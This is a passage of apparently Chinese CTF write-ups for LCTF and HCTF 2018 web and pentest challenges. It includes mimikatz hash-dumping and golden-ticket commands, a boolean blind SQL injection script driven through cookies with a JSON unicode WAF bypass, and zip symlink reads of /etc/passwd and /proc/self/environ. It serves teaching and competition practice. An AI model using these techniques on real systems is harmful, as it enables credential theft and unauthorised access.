上执行</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest20.png" alt="此处输入图片的描述"></p><p>我们弹回子域域控</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest21.png" alt="此处输入图片的描述"></p><p>然后就是一套注入 sidhistory 的操作</p><p>(1)首先,我们需要得到域用户的安全认证标识符</p><pre><code class="hljs">shell wmic useraccount get Caption,sid</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest22.png" alt="此处输入图片的描述"></p><p>我们重点关注的是 </p><pre><code class="hljs">WEB\krbtgt          S-1-5-21-508737280-3758319117-1445457868-50</code></pre><p>他和 krb 有关系，相当于是域的一个令牌的中心，我们需要重点关注</p><p>(2)我们通过 mimikatz 得到当前域的 NTML 认证令牌</p><pre><code class="hljs">mimikatz lsadump::lsa /patch</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest23.png" alt="此处输入图片的描述"></p><p>(3)我们向当前域注入我们的 sid history ,这个 history 有一个继承性，拥有了这个 history 的机子就有了原始机器的属性</p><pre><code class="hljs">mimikatz kerberos::golden /admin:administrator /domain:web.lctf.com /sid:S-1-5-21-508737280-3758319117-1445457868 /sids:S-1-5-21-35370905-2178818314-1839806818-519 /krbtgt:42cb5299c2e40ad7d04cb2d7d16f3a46 /startoffset:0</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest24.png" alt="此处输入图片的描述"></p><p>(4)访问父域域控的桌面找到 flag</p><pre><code class="hljs">shell type \\dc\c$\Users\\Administrator\\Desktop\\flag.txt</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest25.png" alt="此处输入图片的描述"></p><h2 id="0X04-T4lk-1s-ch34p-sh0w-m3-the-sh31l-sh0w-m3-the-sh31l-4ga1n"><a href="#0X04-T4lk-1s-ch34p-sh0w-m3-the-sh31l-sh0w-m3-the-sh31l-4ga1n" class="headerlink" title="0X04 T4lk 1s ch34p,sh0w m3 the sh31l&#x2F;sh0w m3 the sh31l 4ga1n"></a><strong>0X04 T4lk 1s ch34p,sh0w m3 the sh31l&#x2F;sh0w m3 the sh31l 4ga1n</strong></h2><p>这道题是我出的题，还有另一道是这道题的衍生，但是由于出题过程中的非预期，导致这道题没有触及到我想要考察的点，但是我本身的 wp 还是按照我的预期解写的，有兴趣的可以转到<a href="http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">这篇文章</a></p><h2 id="0X05-年久失修的系统"><a href="#0X05-年久失修的系统" class="headerlink" title="0X05 年久失修的系统"></a><strong>0X05 年久失修的系统</strong></h2><p>这道题我在比赛过程中也没来得及看，就大概知道是一个注入，但是最后是0解，真的神了，一般来讲注入0解的情况在比赛中并不常见，也正因为这个原因我赛后非常好奇的看了 klaus 师傅的 wp ，确实让我比较惊讶，这里考察的是一个神奇的点—–用户自定义变量</p><p>可能有的同学不知道什么是用户自定义变量，但是你一定见过 @@datadir  、@@version、@@tmpdir 、@@basedir 等，这些我们在之前的注入中绝对用过，利用这种内置的变量我们能获取一些敏感信息，那么用户变量又是什么呢？</p><p>和系统变量不同的是，用户变量的定义方式是使用一个 @ ,他的定义格式是这个样子的</p><pre><code class="hljs">SET @var_name = expr [, @var_name = expr] ...</code></pre><p><strong>我们实验一下：</strong></p><pre><code class="hljs">mysql&gt; set @a = 1;Query OK, 0 rows affected (0.00 sec)mysql&gt; select @a;+------+| @a   |+------+|    1 |+------+1 row in set (0.00 sec)</code></pre><blockquote><p><strong>注意：</strong></p><p>(1)可以先在用户变量中保存值然后在以后引用它；这样可以将值从一个语句传递到另一个语句。用户变量与连接有关。也就是说，一个客户端定义的变量不能被其它客户端看到或使用。当客户端退出时，该客户端连接的所有变量将自动释放。<br>(2)对于 SET，可以使用&#x3D;或:&#x3D;作为分配符。分配给每个变量的expr可以为整数、实数、字符串或者NULL值。<br>(3)也可以用 select 语句代替SET来为用户变量分配一个值。在这种情况下，分配符必须为:&#x3D;而不能用&#x3D;，因为在非SET语句中&#x3D;被视为一个比较 操作符：</p></blockquote><p>我们来尝试一下使用 select 语句给自定义变量赋值</p><pre><code class="hljs">mysql&gt; select @a:=2;+-------+| @a:=2 |+-------+|     2 |+-------+1 row in set (0.00 sec)mysql&gt; select @a:=3;+-------+| @a:=3 |+-------+|     3 |+-------+1 row in set (0.00 sec)</code></pre><p>那我们能不能使用表达式给变量赋值呢？答案是可以的，我们看下面的实验</p><pre><code class="hljs">mysql&gt; select ID ,@rownum:=@rownum+1 as rownum from city order by ID limit 10;+----+--------+| ID | rownum |+----+--------+|  1 |     11 ||  2 |     12 ||  3 |     13 ||  4 |     14 ||  5 |     15 ||  6 |     16 ||  7 |     17 ||  8 |     18 ||  9 |     19 || 10 |     20 |+----+--------+10 rows in set (0.00 sec)</code></pre><p>这样就实现了逐个增加，是不是很神奇？我们再来看下面的测试</p><pre><code class="hljs">mysql&gt; select @b:=@b is not null;+--------------------+| @b:=@b is not null |+--------------------+|                  0 |+--------------------+1 row in set (0.00 sec)mysql&gt; select @b:=@b is not null;+--------------------+| @b:=@b is not null |+--------------------+|                  1 |+--------------------+1 row in set (0.00 sec)</code></pre><p>这个怎么理解呢？我们先来看赋值号后面的这个表达式 </p><pre><code class="hljs">@b is not null</code></pre><p>由于 @b 并没有在当前的会话中定义过，于是一开始是 null ，然后我们做了个判断，判断 @b 不是 null ,很明显这个得到的是假，也就是 0 ,那么再执行完这个语句之后 @b 就被赋值为 0 ，当第二次再执行的时候就是判断 0 不是 Null ,这次肯定是真，于是返回1 此时 @b 就被赋值为1</p><p> 那么这道题就是利用了这个点，在用户的一个会话中实现查询两次的过程中自动修改值</p><p> 10094-9921*@a:&#x3D;@a is not null </p><pre><code class="hljs">mysql&gt; select 10094-9921*@e:=@e is not null ;+-------------------------------+| 10094-9921*@e:=@e is not null |+-------------------------------+|                         10094 |+-------------------------------+1 row in set (0.00 sec)mysql&gt; select 10094-9921*@e:=@e is not null ;+-------------------------------+| 10094-9921*@e:=@e is not null |+-------------------------------+|                           173 |+-------------------------------+1 row in set (0.00 sec)</code></pre><p>这样达到了在绕过对 select 中的值的检查的同时在 update 修改了 admin 的密码的</p><h2 id="0X06-参考"><a href="#0X06-参考" class="headerlink" title="0X06 参考"></a><strong>0X06 参考</strong></h2><p><a href="http://wupco.cn/hctf/ezphp.pdf">http://wupco.cn/hctf/ezphp.pdf</a><br><a href="http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/">http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/</a><br><a href="https://www.anquanke.com/post/id/153065#h2-5">https://www.anquanke.com/post/id/153065#h2-5</a><br><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a><br><a href="https://xz.aliyun.com/t/3336">https://xz.aliyun.com/t/3336</a><br><a href="http://seaii-blog.com/index.php/2018/03/12/78.html">http://seaii-blog.com/index.php/2018/03/12/78.html</a><br><a href="https://github.com/wonderkun/CTF_web/blob/master/web600-1/README.md?1520943473140">https://github.com/wonderkun/CTF_web/blob/master/web600-1/README.md?1520943473140</a><br><a href="https://www.anquanke.com/post/id/164569">https://www.anquanke.com/post/id/164569</a><br><a href="https://www.cnblogs.com/backlion/p/8127868.html">https://www.cnblogs.com/backlion/p/8127868.html</a><br><a href="https://segmentfault.com/a/1190000009540449">https://segmentfault.com/a/1190000009540449</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HCTF 2018 web 部分题目 详细 writeup</title>
    <link href="/2018/11/20/HCTF%202018%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%20%E8%AF%A6%E7%BB%86%20writeup/"/>
    <url>/2018/11/20/HCTF%202018%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%20%E8%AF%A6%E7%BB%86%20writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>每年 HCTF 都收获颇丰，今年又在 L-team 队友们的帮助下学到了很多东西，记录一下，还是太菜了，要多学习才行，还有就是不要偷懒，多多尝试和研究，偷懒是一个人走向失败的开始。</p><h2 id="0X01-warmup"><a href="#0X01-warmup" class="headerlink" title="0X01 warmup"></a><strong>0X01 warmup</strong></h2><p>热身题，hint 页面存在一个文件包含，还告诉了 flag 的文件名</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20warmup1.png" alt="此处输入图片的描述"></p><p>扫了一下目录，发现了一个 source.php</p><span id="more"></span><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20warmup2.png" alt="此处输入图片的描述"></p><p>访问后看到源码</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?php    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#39;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#39;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;        include $_REQUEST[&#39;file&#39;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    &#125;  ?&gt;</code></pre><p>重点逻辑在这里</p><pre><code class="hljs">    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;        include $_REQUEST[&#39;file&#39;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    &#125;  </code></pre><p>我们只要满足下面这个为真，并且让 file 成为我们的 flag 就行了</p><pre><code class="hljs">    emmm::checkFile($_REQUEST[&#39;file&#39;]</code></pre><p>因为这部分有个 url 解码</p><pre><code class="hljs">    $_page = urldecode($page);    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) &#123;        return true;    &#125;</code></pre><p>猜想可能本身服务端对客户端传过去的东西没有过解码，%3a 不会被转换成 ？于是就能利用跨目录的方法</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20warmup3.png" alt="此处输入图片的描述"></p><h2 id="0X02-Kzone"><a href="#0X02-Kzone" class="headerlink" title="0X02 Kzone"></a><strong>0X02 Kzone</strong></h2><p>一个模拟钓鱼的题，<a href="http://www.zip/">www.zip</a> 能直接下载整站源码，里面的admin 目录下所有页面的登录验证逻辑都是检测一个全局变量值 islogin 是否为1 ，如果为1 就能直接访问，</p><pre><code class="hljs">&lt;?phpinclude(&quot;../include/common.php&quot;);if ($islogin == 1) &#123;&#125; else exit(&quot;&lt;script language=&#39;javascript&#39;&gt;window.location.href=&#39;./login.php&#39;;&lt;/script&gt;&quot;);?&gt;</code></pre><p>判断的逻辑是</p><pre><code class="hljs">&lt;?phpif (!defined(&#39;IN_CRONLITE&#39;)) exit();$islogin = 0;if (isset($_COOKIE[&quot;islogin&quot;])) &#123;    if ($_COOKIE[&quot;login_data&quot;]) &#123;        $login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);        $admin_user = $login_data[&#39;admin_user&#39;];        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);        if ($udata[&#39;username&#39;] == &#39;&#39;) &#123;            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);        &#125;        $admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);        if ($admin_pass == $login_data[&#39;admin_pass&#39;]) &#123;            $islogin = 1;        &#125; else &#123;            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);        &#125;    &#125;&#125;</code></pre><p>可以看到</p><pre><code class="hljs">$login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);$admin_user = $login_data[&#39;admin_user&#39;];$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);...$admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);if ($admin_pass == $login_data[&#39;admin_pass&#39;]) &#123;    $islogin = 1;</code></pre><p><code>$admin_pass</code> 是从数据库查出来的，不过进行了 sha1 编码， <code>$login_data[&#39;admin_pass&#39;]</code> 是从 cookie 中得到的，我们可控，并且中间用的是 &#x3D;&#x3D; ，也就是存在弱类型绕过漏洞，由于无法确定 admin 的密码在 sha1 后的结果是什么，我们需要对其前面几个字符爆破</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20Kzone1.png" alt="此处输入图片的描述"></p><p>然后浏览器设置 cookie 为这个值就能访问所有页面了，登进去以后就是列用户、改密码、删除用户、的页面，没什么太多功能，基本将后面的步骤锁定成对 admin 表的注入，毕竟之前看到的 blacklist 过滤的东西不是特别的多，还比较有机会成功。</p><p>比较了一下 where 可控(毕竟我们要子查询)，并且没有对 单引号进行过滤的有三处，那就是 delete.php export.php 和 member.php </p><p><strong>export.php</strong> </p><pre><code class="hljs">$zhi = $_GET[&#39;id&#39;];if ($zhi == &#39;&#39;) &#123;    exit(&#39;id error！&#39;);&#125;$sql = &quot;select * from fish_user where id in($zhi);&quot;;$update = &quot;update fish_user set output=1 where id in($zhi);&quot;;</code></pre><p><strong>delete.php</strong>  </p><pre><code class="hljs">$zhi=$_GET[&#39;id&#39;];$sql=&quot;delete from fish_user where id in($zhi);&quot;;</code></pre><p><strong>member.php</strong></p><pre><code class="hljs">$login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);$admin_user = $login_data[&#39;admin_user&#39;];$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);</code></pre><p>但是后来出题人把 delete.php 给删了，感觉意思是不希望在这个地方注入(应该不是预期解，出题人可能忘过滤了)，那后来就锁定了 mem ber.php 也就是说这是一个 cookie 注入，利用的就是刚刚构造好的 cookie </p><p>我们看一下黑名单</p><p><strong>blacklist</strong></p><pre><code class="hljs">function waf($string)&#123;    $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;;    return preg_replace_callback($blacklist, function ($match) &#123;        return &#39;@&#39; . $match[0] . &#39;@&#39;;    &#125;, $string);&#125;</code></pre><p><strong>从一下几个方面去看</strong></p><p>1.是联合还是查询子句<br>2.语句构造过程中的细节（注释、空格、&#x3D;、or、逗号等是否过滤）<br>3.注入方式（显位、bool 还是 time，当然这个要结合自己的尝试）</p><p><strong>根据上面的步骤分析一下</strong></p><p>(1)首先 union 过滤，也就是我们没法联合查询，但是实际本身这东西也没有回显，Union 有没有并不影响我们注入,我们用 and … 子查询<br>(2)过滤了 # 、 -和 空白符，没法注释需要闭合，空格过滤需要括号<br>(3)过滤了 &#x3D; like 我们考虑用 in 代替<br>(4)过滤了 or ，我们 information 都不能用，但是可以用 mysql.innodb_table_stats 查表名和库名，用亦或盲注 (可以看一下官方介绍<a href="https://mariadb.com/kb/en/library/mysqlinnodb_table_stats/">https://mariadb.com/kb/en/library/mysqlinnodb_table_stats/</a>)<br>(5)过滤 sleep benchmark if ,还能用  Get_lock() rlike ，但要先确认是不是时间盲注，后来发现是布尔盲注<br>(6)确认了布尔注入以后我们看一下，怎么获取每一位数据，因为过滤了 mid substr &#x3D;  我们其实还能用搜素字符串的方式 locate position instr 等配合 in </p><p>分析了差不多，我们就可以开始构造语句了</p><p>先写出一个基本的框架</p><p>{“admin_pass”:65,”admin_user”:”admin’and(1)and’1”}</p><p>我们现在在() 中填充我们的子查询语句，判断数据库，但是由于这个盲注，需要一位一位的判断，所以必须使用脚本，因为我们用的是判断字符串在第几位的函数，不是根据指定位置截取字符串的函数，因此必须要每一次将字符串累加，然后每次一次都要判断是不是出现在第一位，难度相对大一些</p><p>首先跑了一下数据库名：hctf_kouzone</p><p>然后跑表名得到 ：F1444g</p><p>字段名就不能直接跑了，我们必须要手工， 因为我们已经知道了 flag 开头时 hctf 那我们就手工试一下就行了，后来发现是f1a9</p><p>跑 flag </p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20kzone2.png" alt="此处输入图片的描述"></p><p><strong>附上脚本：</strong></p><pre><code class="hljs">import requestsurl = &quot;http://kzone.2018.hctf.io/admin/list.php&quot;cookies = &#123;&quot;PHPSESSID&quot;: &quot;rm5c9tdnlchu0s0rqdgi4f1n22&quot;, &quot;islogin&quot;: &quot;1&quot;, &#125;# payload1 = &#39;&#39;&#39;&#123;&#123;"admin_pass":65,"admin_user":"admin'and(locate('&#123;&#125;&#123;&#125;',(select(group_concat(database_name))from(mysql.innodb_table_stats))))and'1"&#125;&#125;&#39;&#39;&#39;# payload2 = &#39;&#39;&#39;&#123;&#123;"admin_pass":65,"admin_user":"admin'and(locate('&#123;&#125;&#123;&#125;',(select(group_concat(database_name))from(mysql.innodb_table_stats)))^1)and'1"&#125;&#125;&#39;&#39;&#39;# payload1 = &#39;&#39;&#39;&#123;&#123;"admin_pass":65,"admin_user":"admin'and(locate('&#123;&#125;&#123;&#125;',(select(group_concat(table_name))from(mysql.innodb_table_stats))))and'1"&#125;&#125;&#39;&#39;&#39;# payload2 = &#39;&#39;&#39;&#123;&#123;"admin_pass":65,"admin_user":"admin'and(locate('&#123;&#125;&#123;&#125;',(select(group_concat(table_name))from(mysql.innodb_table_stats)))^1)and'1"&#125;&#125;&#39;&#39;&#39;payload1 = &#39;&#39;&#39;&#123;&#123;"admin_pass":65,"admin_user":"admin'and(locate('&#123;&#125;&#123;&#125;',(select(f1a9)from(F1444g))))and'1"&#125;&#125;&#39;&#39;&#39;payload2 = &#39;&#39;&#39;&#123;&#123;"admin_pass":65,"admin_user":"admin'and(locate('&#123;&#125;&#123;&#125;',(select(f1a9)from(F1444g)))^1)and'1"&#125;&#125;&#39;&#39;&#39;get = &quot;&quot;for i in xrange(50):for j in xrange(32,127):data = payload1.format(get,chr(j))cookies[&#39;login_data&#39;] = datar = requests.get(url,cookies = cookies)if &#39;KK&#39; in r.content:data = payload2.format(get,chr(j))cookies[&#39;login_data&#39;] = datar = requests.get(url,cookies = cookies)if &#39;KK&#39; not in r.content:get = get + chr(j)print getbreak</code></pre><p><strong>更新 ：11.21</strong> 有师傅私聊和我说，这道题的另一种非常巧妙的绕过方法，就是在下面这段代码的地方</p><pre><code class="hljs">$login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);$admin_user = $login_data[&#39;admin_user&#39;];$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);...$admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);if ($admin_pass == $login_data[&#39;admin_pass&#39;]) &#123;    $islogin = 1;</code></pre><p>我们甚至可以直接在里面注入拿到 flag ，我们再回过头来看一下这道题的 waf 部分</p><pre><code class="hljs">&lt;?phpfunction waf($string)&#123;    $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;;    return preg_replace_callback($blacklist, function ($match) &#123;        return &#39;@&#39; . $match[0] . &#39;@&#39;;    &#125;, $string);&#125;function safe($string)                                    // safe 的作用就是 过一下 waf&#123;    if (is_array($string)) &#123;        foreach ($string as $key =&gt; $val) &#123;            $string[$key] = safe($val);        &#125;    &#125; else &#123;        $string = waf($string);    &#125;    return $string;&#125;...foreach ($_COOKIE as $key =&gt; $value) &#123;    if (is_string($value) &amp;&amp; !is_numeric($value)) &#123;        $value = safe($value);    &#125;    $_COOKIE[$key] = $value;&#125;unset($cplen, $key, $value);?&gt;</code></pre><p>可以看到我们传入的 cookie 会被送到 safe() 函数里面，然后safe() 又调用了 waf()，那我们怎么绕过呢？你有没有发现我们传进来的 cookie 在判断前还经历了一个比较重要的步骤，json_decode() 而 json_decode 他的一个特性就是对传入的 unicode 值会进行还原，我们来做一个实验</p><p><strong>test2.php</strong></p><pre><code class="hljs">$a = array(&#39;username&#39;=&gt;&#39;\u0061\u0064\u006d\u0069\u006e&#39;);echo json_encode($a);echo &quot;&lt;br&gt;&quot;;print_r(json_decode(&#39;&#123;&quot;username&quot;:&quot;\\u0061\\u0064\\u006d\\u0069\\u006e&quot;&#125;&#39;));</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;&quot;username&quot;:&quot;\\u0061\\u0064\\u006d\\u0069\\u006e&quot;&#125;stdClass Object ( [username] =&gt; admin ) </code></pre><p>很神奇，也就是说我们在 cookie 中传入 uniode 字符，然后在经过一次 json_decode 以后就转化了回来，利用这种方式我们就能轻松绕过过滤直接实现注入，直捣黄龙。</p><p><strong>在此鸣谢 成信工 的一位师傅向我提供的这个思路，也让我学了很多！</strong></p><h2 id="0X03-hide-and-seek"><a href="#0X03-hide-and-seek" class="headerlink" title="0X03 hide_and_seek"></a><strong>0X03 hide_and_seek</strong></h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20hide_and_seek0.png" alt="此处输入图片的描述"></p><p>一个上传压缩包页面，上传上去会自动解压，然后把压缩包里面的文件内容显示出来，以前类似的漏洞出现过比如 gitlab 的任意文件读取，CTF 中也出过类似的题，可以看这篇文章：<a href="https://xz.aliyun.com/t/2589%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%88%A9%E7%94%A8">https://xz.aliyun.com/t/2589，就是利用</a> Linux 的软链接来任意文件读取</p><p>我们首先构造一个指向 &#x2F;etc&#x2F;passwd 的软链接文件，看看能不能成功</p><pre><code class="hljs">root@K0rz3n:~# ln -s /etc/passwd test</code></pre><p>看一下软链接的指向   </p><pre><code class="hljs">lrwxrwxrwx  1 root root     11 Nov 11 06:45 test -&gt; /etc/passwd</code></pre><p>现在我们把这个文件进行压缩</p><pre><code class="hljs">root@K0rz3n:~# zip -y test.zip test</code></pre><p>上传然后 submit </p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20hide_and_seek1.png" alt="此处输入图片的描述"></p><p>我们看到的确实现了任意文件包含，但是现在我们包含什么文件？根据题目的提示是 docker ,我们先看一下这个 docker 是什么 docker </p><pre><code class="hljs">root@K0rz3n:~# ln -s /start.sh testroot@K0rz3n:~# zip -y test.zip test</code></pre><p>得到</p><pre><code class="hljs">#! /usr/bin/env bash set -e # If there&#39;s a prestart.sh script in the /app directory, run it before starting PRE_START_PATH=/app/prestart.sh echo &quot;Checking for script in $PRE_START_PATH&quot; if [ -f $PRE_START_PATH ] ; then echo &quot;Running script $PRE_START_PATH&quot; source $PRE_START_PATH else echo &quot;There is no script $PRE_START_PATH&quot; fi # Start Supervisor, with Nginx and uWSGI exec /usr/bin/supervisord </code></pre><p>搜索了一下发现这是一个部署 python 应用程序的东西，比如使用 uWSGI+Nginx+Supervisor部署管理Django应用程序，也就是说存在 app 这个目录，顺势读一下 &#x2F;app&#x2F;main.py</p><pre><code class="hljs">from flask import Flask app = Flask(__name__) @app.route(&quot;/&quot;) def hello(): return &quot;Hello World from Flask in a uWSGI Nginx Docker container with \ Python 3.6 (default)&quot; if __name__ == &quot;__main__&quot;: app.run(host=&#39;0.0.0.0&#39;, debug=True, port=80) </code></pre><p>发现这个是默认的 flask 文件，但是已经把 docker 的信息显示出来了，uWSGI Nginx Docker，我们可以自己下载对应的 docker 玩一下，但是这也很明显发现了另一个问题，他应该是换了默认的 web 应用的文件位置，这个位置可以通过 uwsgi 看到，那么这就涉及到了查看当前运行进程的一些信息了，怎么查看呢？我们要用到虚文件系统 proc 了， 那我们读一下 &#x2F;proc&#x2F;self&#x2F;environ 查看当前运行进程的环境变量吧(这里其实还有一种就是通过读 &#x2F;proc&#x2F;self&#x2F;cmdline 查看当前进程的完整启动命令，也能获取一些 docker 的信息,后来看了飞猪的 wp 发现读日志也能获取很多有用的信息)</p><pre><code class="hljs">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=054752cb2fb0SHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</code></pre><p>很明显我们发现了关键信息</p><pre><code class="hljs">UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code></pre><p>我们读一下</p><pre><code class="hljs">[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app </code></pre><p>这个 module 什么意思呢？我查了一下</p><p>如果是 这么写的</p><pre><code class="hljs">module = partner.wsgi:application</code></pre><p>就表示对于- myweb_uwsgi.ini文件来说，与它的平级的有一个partner目录，这个目录下有一个wsgi.py文件</p><p>于是我们找到了一个关键文件 hard_t0_guess_also_df45v48ytj9_main.py</p><p>我们读一下 &#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg&#x2F;hard_t0_guess_also_df45v48ytj9_main.py</p><pre><code class="hljs">#- * -coding: utf - 8 - * -from flask import Flask, session, render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flag from werkzeug.utils import secure_filenameimport os random.seed(uuid.getnode()) app =Flask(__name__) app.config[&#39;SECRET_KEY&#39;] = str(random.random() *100) app.config[&#39;UPLOAD_FOLDER&#39;] =&#39;./uploads&#39;app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 100 *1024 ALLOWED_EXTENSIONS = set([&#39;zip&#39;]) def allowed_file(filename):    return &#39;.&#39;     in filename and\     filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS@ app.route(&#39;/&#39;, methods = [&#39;GET&#39;]) def index():        error = request.args.get(&#39;error&#39;, &#39;&#39;)         if (error ==&#39;1&#39;):             session.pop(&#39;username&#39;, None)             return render_template(&#39;index.html&#39;,forbidden = 1)         if &#39;username&#39; in session:             return render_template(&#39;index.html&#39;, user =session[&#39;username&#39;], flag =flag.flag)        else :            return render_template(&#39;index.html&#39;)@ app.route(&#39;/login&#39;, methods = [&#39;POST&#39;]) def login():     username =request.form[&#39;username&#39;]     password =request.form[&#39;password&#39;]    if request.method == &#39;POST&#39; and username != &#39;&#39; and password != &#39;&#39;:         if (username ==&#39;admin&#39;):             return redirect(url_for(&#39;index&#39;, error =1))         session[&#39;username&#39;] = username        return redirect(url_for(&#39;index&#39;))@ app.route(&#39;/logout&#39;, methods = [&#39;GET&#39;]) def logout():     session.pop(&#39;username&#39;, None)     return redirect(url_for(&#39;index&#39;))@ app.route(&#39;/upload&#39;, methods = [&#39;POST&#39;]) def upload_file():     if &#39;the_file&#39; not in request.files:         return redirect(url_for(&#39;index&#39;))         file =request.files[&#39;the_file&#39;]    if file.filename == &#39;&#39;:         return redirect(url_for(&#39;index&#39;))     if file and allowed_file (file.filename):         filename =secure_filename(file.filename)         file_save_path =os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)         if (os.path.exists(file_save_path)):             return &#39;This file already exists&#39;    file.save(file_save_path)else :    return &#39;This file is not a zipfile&#39;try:     extract_path = file_save_path + &#39;_&#39;     os.system(&#39;unzip -n &#39; + file_save_path +&#39; -d &#39; + extract_path) read_obj =os.popen(&#39;cat &#39; + 